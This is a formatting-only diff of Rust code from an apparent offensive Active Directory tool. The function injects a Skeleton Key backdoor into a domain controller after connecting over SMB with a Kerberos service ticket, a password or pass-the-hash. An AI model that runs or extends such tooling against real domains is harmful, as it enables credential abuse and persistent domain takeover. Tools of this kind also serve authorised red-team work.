@@ -29,8 +29,8 @@ use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::postex::{
     SkeletonKeyPreflight, SkeletonKeyPreflightStatus, assess_skeleton_key_preflight_from_registry,
 };
-use overthrone_core::proto::kerberos::request_service_ticket;
 use overthrone_core::proto::kerberos::TicketGrantingData;
+use overthrone_core::proto::kerberos::request_service_ticket;
 use overthrone_core::proto::smb::{KerberosTicket, SmbSession};
 use tracing::{debug, info, warn};
 
@@ -108,11 +108,13 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         // Request a TGS for the CIFS service on the target DC
         let cifs_spn = format!("cifs/{}", config.dc_ip);
         info!("[skeleton] Requesting TGS for SPN: {}", cifs_spn);
-        let tgs = request_service_ticket(&config.dc_ip, &tgt, &cifs_spn).await.map_err(|e| {
-            OverthroneError::TicketForge(format!(
-                "Failed to request CIFS service ticket from PKINIT TGT: {e}"
-            ))
-        })?;
+        let tgs = request_service_ticket(&config.dc_ip, &tgt, &cifs_spn)
+            .await
+            .map_err(|e| {
+                OverthroneError::TicketForge(format!(
+                    "Failed to request CIFS service ticket from PKINIT TGT: {e}"
+                ))
+            })?;
 
         // Build KerberosTicket for SMB authentication
         let krb_ticket = KerberosTicket::new(
@@ -123,19 +125,14 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
             Some(cifs_spn),
         );
 
-        SmbSession::connect_with_ticket(
-            &config.dc_ip,
-            &config.domain,
-            &config.username,
-            krb_ticket,
-        )
-        .await
-        .map_err(|e| {
-            OverthroneError::TicketForge(format!(
-                "SMB Kerberos ticket connect to {} failed: {e}",
-                config.dc_ip
-            ))
-        })?
+        SmbSession::connect_with_ticket(&config.dc_ip, &config.domain, &config.username, krb_ticket)
+            .await
+            .map_err(|e| {
+                OverthroneError::TicketForge(format!(
+                    "SMB Kerberos ticket connect to {} failed: {e}",
+                    config.dc_ip
+                ))
+            })?
     } else {
         match (&config.password, &config.nt_hash) {
             (Some(pw), _) => {
@@ -157,19 +154,14 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
                     "[skeleton] Connecting to {} via SMB (pass-the-hash)",
                     config.dc_ip
                 );
-                SmbSession::connect_with_hash(
-                    &config.dc_ip,
-                    &config.domain,
-                    &config.username,
-                    hash,
-                )
-                .await
-                .map_err(|e| {
-                    OverthroneError::TicketForge(format!(
-                        "SMB PTH connect to {} failed: {e}",
-                        config.dc_ip
-                    ))
-                })?
+                SmbSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, hash)
+                    .await
+                    .map_err(|e| {
+                        OverthroneError::TicketForge(format!(
+                            "SMB PTH connect to {} failed: {e}",
+                            config.dc_ip
+                        ))
+                    })?
             }
             _ => {
                 return Err(OverthroneError::TicketForge(
